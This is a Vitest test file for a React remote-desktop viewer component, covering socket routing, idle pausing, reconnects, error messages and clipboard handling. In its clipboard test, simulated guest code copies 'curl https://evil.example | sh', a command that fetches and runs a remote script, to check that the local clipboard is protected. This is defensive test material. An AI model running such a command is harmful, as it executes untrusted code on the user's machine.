// Ways the Desktop viewer can fail, each covered below against the real
// Waymote SDK (only the browser transports and dx Core's answers are faked):
// - it opens a socket anywhere but dx Core's authenticated Thread route, or
//   with the wrong scheme, channel, or subprotocol;
// - it opens sockets before Core says the desktop is ready, or keeps
//   retrying (waking the workspace each time) when Core refuses: it spins
//   instead of saying the workspace has no Desktop or offering a retry;
// - an open, untouched Desktop tab keeps the workspace awake forever;
// - the remote clipboard replaces the local one without the person's own
//   key press or click on the desktop while holding control;
// - it opens the audio channel, which the desktop does not serve;
// - it connects while its tab is hidden, the right pane is collapsed, or the
//   document is hidden, or it keeps sockets open more than a minute after
//   any of those (or drops them at once, so coming back reconnects);
// - it reconnects to the previous Thread after the Thread changes;
// - it hangs on a spinner when the SDK chunk fails to load or the browser
//   cannot decode the stream, instead of saying so and offering a retry that
//   can succeed;
// - the Desktop tab is missing beside Terminal or connects before selection;
// - keys typed into the remote desktop trigger dx shortcuts;
// - it shows the desktop as live before a picture is drawn, with nothing
//   covering the black canvas, so a click there reaches the remote screen
//   unseen;
// - it loses the gateway's latest full picture when that picture, with the
//   frames after it, arrives before the decoder is set up, and then waits
//   for the next full picture, which a still desktop never sends;
// - it waits forever on a stream that opens but draws nothing.

import type { ThreadId } from "@dx/domain";
import * as React from "react";
import { createRoot } from "react-dom/client";
import {
  afterEach,
  beforeAll,
  beforeEach,
  describe,
  expect,
  it,
  vi,
} from "vitest";
import { userEvent } from "vitest/browser";
import "../../styles.css";
import { PaneTreeHarness } from "../../testing/pane-tree-harness.js";
import { DesktopViewer } from "./desktop-viewer.js";

Object.assign(globalThis, { IS_REACT_ACT_ENVIRONMENT: true });

class FakeSocket extends EventTarget {
  static readonly CONNECTING = 0;
  static readonly OPEN = 1;
  static readonly CLOSING = 2;
  static readonly CLOSED = 3;
  static instances: FakeSocket[] = [];
  readonly sent: unknown[] = [];
  readyState = FakeSocket.CONNECTING;
  binaryType = "blob";
  constructor(
    readonly url: string,
    readonly protocols?: string | string[],
  ) {
    super();
    FakeSocket.instances.push(this);
  }
  send(value: unknown) {
    this.sent.push(value);
  }
  close() {
    if (this.readyState === FakeSocket.CLOSED) return;
    this.readyState = FakeSocket.CLOSED;
    this.dispatchEvent(new CloseEvent("close", { code: 1000 }));
  }
  open() {
    this.readyState = FakeSocket.OPEN;
    this.dispatchEvent(new Event("open"));
  }
  /** Core refused the upgrade: the browser sees only a failed socket. */
  refuse() {
    this.readyState = FakeSocket.CLOSED;
    this.dispatchEvent(new Event("error"));
    this.dispatchEvent(new CloseEvent("close", { code: 1006 }));
  }
  receive(message: unknown) {
    this.dispatchEvent(
      new MessageEvent("message", { data: JSON.stringify(message) }),
    );
  }
  receiveBinary(data: ArrayBuffer) {
    this.dispatchEvent(new MessageEvent("message", { data }));
  }
}

/**
 * A WebCodecs decoder that, like a real one, decodes nothing until it has a
 * key frame, and works off its queue after the current task: frames decoded
 * in one burst all count in `decodeQueueSize` until then. Its setup check
 * also answers after a task, as Chromium's does.
 */
class FakeVideoDecoder {
  static decoded: string[] = [];
  static async isConfigSupported() {
    await new Promise((resolve) => setTimeout(resolve, 0));
    return { supported: true };
  }
  state = "unconfigured";
  decodeQueueSize = 0;
  #keyed = false;
  #epoch = 0;
  constructor(private readonly init: { output: (frame: unknown) => void }) {}
  configure() {
    this.state = "configured";
  }
  reset() {
    this.state = "unconfigured";
    this.decodeQueueSize = 0;
    this.#keyed = false;
    this.#epoch += 1;
  }
  close() {
    this.reset();
    this.state = "closed";
  }
  decode(chunk: EncodedVideoChunk) {
    FakeVideoDecoder.decoded.push(chunk.type);
    this.decodeQueueSize += 1;
    const epoch = this.#epoch;
    setTimeout(() => {
      if (epoch !== this.#epoch) return;
      this.decodeQueueSize -= 1;
      if (chunk.type === "key") this.#keyed = true;
      if (!this.#keyed) return;
      this.init.output({
        displayWidth: 1280,
        displayHeight: 720,
        timestamp: chunk.timestamp,
        close() {},
      });
    }, 0);
  }
}

/** One H.264 access unit as the gateway frames it. */
const videoChunk = (key: boolean, index: number) => {
  const buffer = new ArrayBuffer(48);
  const view = new DataView(buffer);
  view.setUint8(0, 2);
  view.setUint8(1, 1);
  view.setUint8(2, key ? 1 : 0);
  view.setBigUint64(12, BigInt(index * 33_333), true);
  view.setUint32(20, 1, true);
  view.setUint16(24, 1280, true);
  view.setUint16(26, 720, true);
  return buffer;
};
/**
 * The most frames the Waymote 0.1.6 gateway sends a new viewer: its latest
 * full picture and up to 240 frames since (`hub.broadcast` in its
 * gateway/main.go). The SDK must hold that many while its decoder is set up.
 */
const GATEWAY_LATEST_PICTURE_FRAMES = 241;
/**
 * What the gateway sends a new viewer: its decoder settings, then the
 * latest full picture and every frame since.
 */
const sendLatestPicture = (stream: FakeSocket, frames = 21) => {
  stream.receive({
    type: "video-config",
    version: 1,
    codec: "avc1.42E034",
    frameRate: 30,
  });
  for (let index = 0; index < frames; index += 1)
    stream.receiveBinary(videoChunk(index === 0, index));
};
let draws: ReturnType<typeof vi.fn>;
const roots: ReturnType<typeof createRoot>[] = [];

type DesktopAnswer = "ready" | "unsupported" | "unavailable" | number;
let desktopAnswers: DesktopAnswer[] = [];
let desktopChecks: string[] = [];
/** dx Core's Desktop status check; answers in order, then `ready`. */
const fakeCore = async (input: RequestInfo | URL) => {
  const url = new URL(String(input), window.location.href);
  desktopChecks.push(url.pathname);
  const answer = desktopAnswers.shift() ?? "ready";
  return typeof answer === "number"
    ? new Response(JSON.stringify({ status: "error" }), { status: answer })
    : Response.json({ status: "success", data: { desktop: answer } });
};

const threadA = "thr_00000000-0000-4000-8000-000000000201" as ThreadId;
const threadB = "thr_00000000-0000-4000-8000-000000000202" as ThreadId;
let visibility: DocumentVisibilityState = "visible";

const setVisibility = async (state: DocumentVisibilityState) => {
  visibility = state;
  await React.act(async () => {
    document.dispatchEvent(new Event("visibilitychange"));
  });
};

const socketFor = (channel: string) =>
  openSockets().find((socket) => socket.url.endsWith(`/${channel}`)) as
    | FakeSocket
    | undefined;
const text = (container: HTMLElement) => container.textContent ?? "";
const button = (container: HTMLElement, label: string) =>
  [...container.querySelectorAll("button")].find((candidate) =>
    candidate.textContent?.includes(label),
  );

const openSockets = () =>
  FakeSocket.instances.filter(
    (socket) => socket.readyState !== FakeSocket.CLOSED,
  );
const channels = (sockets: FakeSocket[]) =>
  sockets.map((socket) => new URL(socket.url).pathname).sort();
const settle = () => React.act(async () => {});
// The viewer loads the SDK lazily; wait until it has opened its sockets.
const connected = async (count = 2) => {
  await vi.waitFor(() => expect(openSockets()).toHaveLength(count));
  await settle();
};

beforeAll(async () => {
  await import("@rockorager/waymote");
});

beforeEach(() => {
  visibility = "visible";
  Object.defineProperty(document, "visibilityState", {
    configurable: true,
    get: () => visibility,
  });
  Object.defineProperty(document, "hidden", {
    configurable: true,
    get: () => visibility === "hidden",
  });
  desktopAnswers = [];
  desktopChecks = [];
  vi.stubGlobal("fetch", vi.fn(fakeCore));
  vi.stubGlobal("WebSocket", FakeSocket);
  FakeVideoDecoder.decoded = [];
  vi.stubGlobal("VideoDecoder", FakeVideoDecoder);
  vi.stubGlobal(
    "ResizeObserver",
    class {
      observe() {}
      disconnect() {}
    },
  );
  draws = vi.fn();
  vi.spyOn(HTMLCanvasElement.prototype, "getContext").mockReturnValue({
    drawImage: draws,
  } as unknown as RenderingContext);
});

afterEach(async () => {
  // A failed test leaves its viewer mounted; unmount it here so its sockets
  // do not leak into the next test.
  for (const root of roots.splice(0)) await React.act(() => root.unmount());
  vi.useRealTimers();
  document.body.replaceChildren();
  FakeSocket.instances = [];
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
});

const render = async (element: React.ReactElement) => {
  const container = document.body.appendChild(document.createElement("div"));
  const root = createRoot(container);
  roots.push(root);
  await React.act(() => root.render(element));
  await settle();
  return { container, root };
};

describe("DesktopViewer", () => {
  it("streams only through dx Core's Thread desktop route, without audio", async () => {
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    await connected();

    expect(channels(openSockets())).toEqual([
      `/v1/threads/${threadA}/desktop/control`,
      `/v1/threads/${threadA}/desktop/stream`,
    ]);
    for (const socket of FakeSocket.instances) {
      expect(socket.url.startsWith(`ws://${window.location.host}/`)).toBe(true);
      expect(socket.protocols).toBeUndefined();
    }
    expect(container.querySelector('[role="application"]')).not.toBeNull();
    await React.act(() => root.unmount());
    expect(openSockets()).toEqual([]);
  });

  it("shows starting until the first picture is drawn, then the live desktop, then reconnecting compactly", async () => {
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    await connected();
    expect(container.querySelector('[role="status"]')?.textContent).toContain(
      "Starting desktop",
    );

    const stream = socketFor("stream") as FakeSocket;
    await React.act(async () => stream.open());
    // Connected, but nothing drawn yet: still starting.
    expect(container.querySelector(".thread-desktop-loading")).not.toBeNull();

    await React.act(async () => sendLatestPicture(stream));
    await vi.waitFor(() => expect(draws).toHaveBeenCalled());
    await settle();
    expect(container.querySelector(".thread-desktop-loading")).toBeNull();
    expect(container.textContent).not.toContain("Reconnecting");

    // The last picture stays on the canvas while the stream reconnects.
    await React.act(async () => {
      stream.readyState = FakeSocket.CLOSED;
      stream.dispatchEvent(new CloseEvent("close", { code: 1006 }));
    });
    expect(container.textContent).toContain("Reconnecting");
    expect(container.querySelector(".thread-desktop-loading")).toBeNull();
    await React.act(() => root.unmount());
  });

  it("draws the latest full picture when it arrives before the decoder is set up", async () => {
    // Returning to a Thread whose desktop is still: the gateway sends its
    // latest full picture and the frames after it in one burst, and no new
    // full picture follows until the screen changes enough.
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    await connected();
    const stream = socketFor("stream") as FakeSocket;
    await React.act(async () => {
      stream.open();
      socketFor("control")?.open();
      sendLatestPicture(stream, GATEWAY_LATEST_PICTURE_FRAMES);
    });
    await vi.waitFor(() => expect(draws).toHaveBeenCalled());
    expect(FakeVideoDecoder.decoded[0]).toBe("key");
    await settle();
    expect(container.querySelector(".thread-desktop-loading")).toBeNull();
    await React.act(() => root.unmount());
  });

  it("covers the desktop until its first picture, so a click there never reaches the remote screen", async () => {
    const { container, root } = await render(
      <div style={{ display: "flex", width: 800, height: 500 }}>
        <DesktopViewer active threadId={threadA} />
      </div>,
    );
    await connected();
    const control = socketFor("control") as FakeSocket;
    await React.act(async () => {
      socketFor("stream")?.open();
      control.open();
    });
    const surface = container.querySelector(
      '[role="application"]',
    ) as HTMLElement;
    const box = surface.getBoundingClientRect();
    const hit = document.elementFromPoint(
      box.left + box.width / 2,
      box.top + box.height / 2,
    );
    expect(hit?.closest(".thread-desktop-loading")).not.toBeNull();

    await userEvent.click(surface, { force: true });
    await settle();
    expect(document.activeElement).not.toBe(surface);
    expect(control.sent).toEqual(
      control.sent.filter((message) => typeof message === "string"),
    );
    expect(control.sent).not.toContain("acquire");
    await React.act(() => root.unmount());
  });

  it("reconnects a stream that opens but draws nothing", async () => {
    vi.useFakeTimers();
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    await connected();
    const stream = socketFor("stream") as FakeSocket;
    // dx Core's relay may not finish a close handshake the browser starts,
    // so a closed stream can stay closing for a long time.
    stream.close = () => {
      stream.readyState = FakeSocket.CLOSING;
    };
    await React.act(async () => {
      stream.open();
      // Only frames that depend on a full picture this viewer never got.
      stream.receive({
        type: "video-config",
        version: 1,
        codec: "avc1.42E034",
        frameRate: 30,
      });
      stream.receiveBinary(videoChunk(false, 1));
    });
    await React.act(() => vi.advanceTimersByTimeAsync(1_000));
    expect(draws).not.toHaveBeenCalled();
    expect(socketFor("stream")).toBe(stream);

    await React.act(() => vi.advanceTimersByTimeAsync(10_000));
    const again = FakeSocket.instances
      .filter((socket) => socket.url.endsWith("/stream"))
      .at(-1) as FakeSocket;
    expect(again).not.toBe(stream);
    expect(stream.readyState).toBe(FakeSocket.CLOSING);
    expect(container.querySelector(".thread-desktop-loading")).not.toBeNull();

    await React.act(async () => {
      again.open();
      sendLatestPicture(again);
    });
    await vi.waitFor(async () => {
      await vi.advanceTimersByTimeAsync(20);
      expect(draws).toHaveBeenCalled();
    });
    await settle();
    expect(container.querySelector(".thread-desktop-loading")).toBeNull();
    await React.act(() => root.unmount());
  });

  it("connects only while shown, and keeps the stream a minute after it leaves the screen", async () => {
    vi.useFakeTimers();
    const { root } = await render(
      <DesktopViewer active={false} threadId={threadA} />,
    );
    await React.act(() => vi.advanceTimersByTimeAsync(5 * 60_000));
    expect(FakeSocket.instances).toEqual([]);

    await React.act(() =>
      root.render(<DesktopViewer active threadId={threadA} />),
    );
    await connected();
    const control = socketFor("control");
    const checks = desktopChecks.length;

    // Hidden briefly: the session stays. The SDK itself pauses video while
    // the document is hidden and resumes it; control and the session (no new
    // status check) survive.
    await setVisibility("hidden");
    await React.act(() => vi.advanceTimersByTimeAsync(50_000));
    expect(openSockets()).toEqual([control]);
    await setVisibility("visible");
    await connected();
    expect(socketFor("control")).toBe(control);
    expect(desktopChecks).toHaveLength(checks);

    // Hidden for longer than the grace period: the stream ends.
    await setVisibility("hidden");
    await React.act(() => vi.advanceTimersByTimeAsync(61_000));
    expect(openSockets()).toEqual([]);
    await setVisibility("visible");
    await connected();

    // A collapsed pane or another tab keeps both sockets for the minute.
    await React.act(() =>
      root.render(<DesktopViewer active={false} threadId={threadA} />),
    );
    await React.act(() => vi.advanceTimersByTimeAsync(50_000));
    expect(openSockets()).toHaveLength(2);
    await React.act(() => vi.advanceTimersByTimeAsync(61_000));
    expect(openSockets()).toEqual([]);
    await React.act(() => root.unmount());
  });

  it("follows the Thread it is given", async () => {
    const { root } = await render(<DesktopViewer active threadId={threadA} />);
    await connected();
    await React.act(() =>
      root.render(<DesktopViewer active threadId={threadB} />),
    );
    await connected();
    expect(channels(openSockets())).toEqual([
      `/v1/threads/${threadB}/desktop/control`,
      `/v1/threads/${threadB}/desktop/stream`,
    ]);
    await React.act(() => root.unmount());
  });

  it("says when the browser cannot decode the desktop and retries on request", async () => {
    vi.stubGlobal("VideoDecoder", undefined);
    Reflect.deleteProperty(globalThis, "VideoDecoder");
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    expect(FakeSocket.instances).toEqual([]);
    expect(container.querySelector(".thread-desktop-loading")).toBeNull();
    expect(container.textContent).toContain("WebCodecs");

    vi.stubGlobal("VideoDecoder", FakeVideoDecoder);
    const retry = [...container.querySelectorAll("button")].find((button) =>
      button.textContent?.includes("Retry"),
    );
    await React.act(async () => retry?.click());
    await connected();
    await React.act(() => root.unmount());
  });

  it("reloads the page to retry a viewer that failed to load", async () => {
    // A failed dynamic import stays failed for the page, and a deployment
    // renames the chunk: only a reload can fetch it.
    const reload = vi.fn();
    const loadClient = vi.fn().mockRejectedValue(new Error("chunk failed"));
    const { container, root } = await render(
      <DesktopViewer
        active
        threadId={threadA}
        loadClient={loadClient}
        reloadPage={reload}
      />,
    );
    await vi.waitFor(() =>
      expect(text(container)).toContain("Desktop viewer failed to load."),
    );
    expect(FakeSocket.instances).toEqual([]);
    await React.act(async () => button(container, "Retry")?.click());
    expect(reload).toHaveBeenCalledTimes(1);
    await React.act(() => root.unmount());
  });

  it("asks Core to start the desktop before opening any socket", async () => {
    let answer: (response: Response) => void = () => undefined;
    const fetch = vi.fn(
      (_input: RequestInfo | URL, _init?: RequestInit) =>
        new Promise<Response>((resolve) => {
          answer = resolve;
        }),
    );
    vi.stubGlobal("fetch", fetch);
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    expect(fetch).toHaveBeenCalledTimes(1);
    expect(fetch.mock.calls[0]?.[0]).toBe(`/v1/threads/${threadA}/desktop`);
    expect(fetch.mock.calls[0]?.[1]?.credentials).toBe("same-origin");
    expect(FakeSocket.instances).toEqual([]);
    expect(container.querySelector(".thread-desktop-loading")).not.toBeNull();

    await React.act(async () =>
      answer(Response.json({ status: "success", data: { desktop: "ready" } })),
    );
    await connected();
    await React.act(() => root.unmount());
  });

  it("says when the workspace has no Desktop and opens no socket", async () => {
    desktopAnswers = ["unsupported"];
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    await vi.waitFor(() =>
      expect(text(container)).toContain(
        "Desktop isn't available in this workspace.",
      ),
    );
    expect(container.querySelector(".thread-desktop-loading")).toBeNull();
    expect(button(container, "Retry")).toBeUndefined();
    expect(FakeSocket.instances).toEqual([]);
    expect(desktopChecks).toHaveLength(1);
    await React.act(() => root.unmount());
  });

  it.each([
    ["unavailable", "The desktop didn't start."],
    [503, "The desktop couldn't be reached."],
    [409, "Unarchive the Thread to use its desktop."],
  ] as const)(
    "offers a retry when Core answers %s",
    async (answer, message) => {
      desktopAnswers = [answer];
      const { container, root } = await render(
        <DesktopViewer active threadId={threadA} />,
      );
      await vi.waitFor(() => expect(text(container)).toContain(message));
      expect(FakeSocket.instances).toEqual([]);

      await React.act(async () => button(container, "Retry")?.click());
      await connected();
      expect(desktopChecks).toHaveLength(2);
      await React.act(() => root.unmount());
    },
  );

  it("stops retrying sockets Core refuses and says why", async () => {
    vi.useFakeTimers();
    // Ready at first; the desktop then stops, and Core says so.
    desktopAnswers = ["ready", "unavailable"];
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    await connected();
    await vi.waitFor(
      async () => {
        for (const socket of openSockets()) socket.refuse();
        await vi.advanceTimersByTimeAsync(1_000);
        expect(desktopChecks).toHaveLength(2);
      },
      { timeout: 10_000, interval: 5 },
    );
    await settle();
    expect(text(container)).toContain("The desktop didn't start.");
    const attempts = FakeSocket.instances.length;
    expect(attempts).toBeLessThanOrEqual(8);
    await vi.advanceTimersByTimeAsync(60_000);
    expect(FakeSocket.instances).toHaveLength(attempts);
    expect(openSockets()).toEqual([]);

    await React.act(async () => button(container, "Retry")?.click());
    await connected();
    await React.act(() => root.unmount());
  });

  it("gives up on sockets that keep failing while Core says ready", async () => {
    vi.useFakeTimers();
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    await connected();
    await vi.waitFor(
      async () => {
        for (const socket of openSockets()) socket.refuse();
        await vi.advanceTimersByTimeAsync(1_000);
        expect(text(container)).toContain("The desktop stopped responding.");
      },
      { timeout: 10_000, interval: 5 },
    );
    // The first check, two recoveries, and the check that gives up.
    expect(desktopChecks).toHaveLength(4);
    const attempts = FakeSocket.instances.length;
    await vi.advanceTimersByTimeAsync(60_000);
    expect(FakeSocket.instances).toHaveLength(attempts);
    expect(desktopChecks).toHaveLength(4);
    await React.act(() => root.unmount());
  });

  it("pauses an untouched desktop after five minutes so the workspace can sleep", async () => {
    vi.useFakeTimers();
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    await connected();
    await React.act(async () => {
      const stream = socketFor("stream") as FakeSocket;
      stream.open();
      sendLatestPicture(stream);
    });
    await React.act(() => vi.advanceTimersByTimeAsync(100));
    expect(draws).toHaveBeenCalled();
    await React.act(async () => socketFor("control")?.open());
    const surface = container.querySelector(
      '[role="application"]',
    ) as HTMLElement;

    // The SDK's once-a-second ping and feedback are not the person's input.
    await React.act(() => vi.advanceTimersByTimeAsync(4 * 60_000));
    expect(socketFor("control")?.sent.length).toBeGreaterThan(200);
    await React.act(async () => {
      surface.dispatchEvent(
        new PointerEvent("pointermove", { bubbles: true, clientX: 5 }),
      );
    });
    await React.act(() => vi.advanceTimersByTimeAsync(4 * 60_000));
    expect(openSockets()).toHaveLength(2);
    expect(text(container)).not.toContain("Paused");

    await React.act(() => vi.advanceTimersByTimeAsync(60_000 + 1_000));
    expect(openSockets()).toEqual([]);
    expect(text(container)).toContain("Paused to let the workspace sleep.");
    expect(container.querySelector('[role="application"]')).toBeNull();
    const checks = desktopChecks.length;
    await React.act(() => vi.advanceTimersByTimeAsync(60 * 60_000));
    expect(FakeSocket.instances.filter((s) => s.readyState !== 3)).toEqual([]);
    expect(desktopChecks).toHaveLength(checks);

    await React.act(async () => button(container, "Resume")?.click());
    await connected();
    expect(desktopChecks).toHaveLength(checks + 1);
    await React.act(() => root.unmount());
  });

  it("copies the remote clipboard only after the person's own input while in control", async () => {
    vi.useFakeTimers();
    const writeText = vi.fn(async (_text: string) => undefined);
    Object.defineProperty(navigator, "clipboard", {
      configurable: true,
      value: { writeText },
    });
    vi.spyOn(document, "hasFocus").mockReturnValue(true);
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    await connected();
    await React.act(async () => {
      const stream = socketFor("stream") as FakeSocket;
      stream.open();
      sendLatestPicture(stream);
    });
    await React.act(() => vi.advanceTimersByTimeAsync(100));
    expect(draws).toHaveBeenCalled();
    const control = socketFor("control") as FakeSocket;
    await React.act(async () => control.open());
    const surface = container.querySelector(
      '[role="application"]',
    ) as HTMLElement;
    const remoteCopies = async (copied: string) => {
      await React.act(async () =>
        control.receive({ type: "clipboard", text: copied }),
      );
    };
    const press = async () => {
      await React.act(async () => {
        surface.dispatchEvent(
          new KeyboardEvent("keydown", {
            bubbles: true,
            code: "KeyC",
            key: "c",
            ctrlKey: true,
          }),
        );
      });
    };

    // Guest code copies while the page merely has focus.
    await remoteCopies("curl https://evil.example | sh");
    // The person types, but does not hold control.
    await press();
    await remoteCopies("curl https://evil.example | sh");
    expect(writeText).not.toHaveBeenCalled();
    await React.act(() => vi.advanceTimersByTimeAsync(5_000));

    await React.act(async () => surface.focus());
    await React.act(async () =>
      control.receive({ type: "control-state", state: "active" }),
    );
    await remoteCopies("unprompted");
    expect(writeText).not.toHaveBeenCalled();

    await press();
    await remoteCopies("copied by the person");
    expect(writeText).toHaveBeenCalledExactlyOnceWith("copied by the person");

    await React.act(() => vi.advanceTimersByTimeAsync(5_000));
    await remoteCopies("later, by guest code");
    expect(writeText).toHaveBeenCalledTimes(1);

    // Pasting the local clipboard into the desktop still works.
    const paste = new Event("paste", { bubbles: true, cancelable: true });
    Object.assign(paste, {
      clipboardData: {
        types: ["text/plain"],
        getData: () => "local text",
      },
    });
    await React.act(async () => {
      surface.dispatchEvent(paste);
    });
    expect(control.sent).toContainEqual(
      JSON.stringify({ type: "clipboard-write", text: "local text" }),
    );
    Reflect.deleteProperty(navigator, "clipboard");
    await React.act(() => root.unmount());
  });

  it("appears as a Desktop tab beside Terminal and connects once selected", async () => {
    vi.useFakeTimers();
    const { container, root } = await render(
      <PaneTreeHarness
        main={null}
        changes={<div>Changes</div>}
        terminal={<div>Terminal</div>}
        open={["changes", "terminal"]}
        desktop={(active) => (
          <DesktopViewer active={active} threadId={threadA} />
        )}
      />,
    );
    expect(FakeSocket.instances).toEqual([]);

    // Opened from the pane's Open Tab menu, Desktop joins the tabs after
    // Terminal and connects once shown.
    const openTab = [
      ...container.querySelectorAll<HTMLButtonElement>(
        'button[aria-label="Open Tab"]',
      ),
    ].at(-1);
    await React.act(() => openTab?.click());
    const item = [
      ...document.querySelectorAll<HTMLElement>('[role="menuitem"]'),
    ].find((candidate) => candidate.textContent?.includes("Desktop"));
    await React.act(() => item?.click());
    await React.act(() => vi.advanceTimersByTimeAsync(50));
    const tabs = [...container.querySelectorAll('[role="tab"]')].map(
      (tab) => tab.textContent,
    );
    expect(tabs.slice(tabs.indexOf("Terminal"))).toEqual([
      "Terminal",
      "Desktop",
    ]);
    await connected();

    await React.act(() =>
      container
        .querySelector<HTMLButtonElement>("#thread-view-tab-changes")
        ?.click(),
    );
    expect(openSockets()).toHaveLength(2);
    await React.act(() => vi.advanceTimersByTimeAsync(61_000));
    expect(openSockets()).toEqual([]);
    await React.act(() => root.unmount());
  });
});
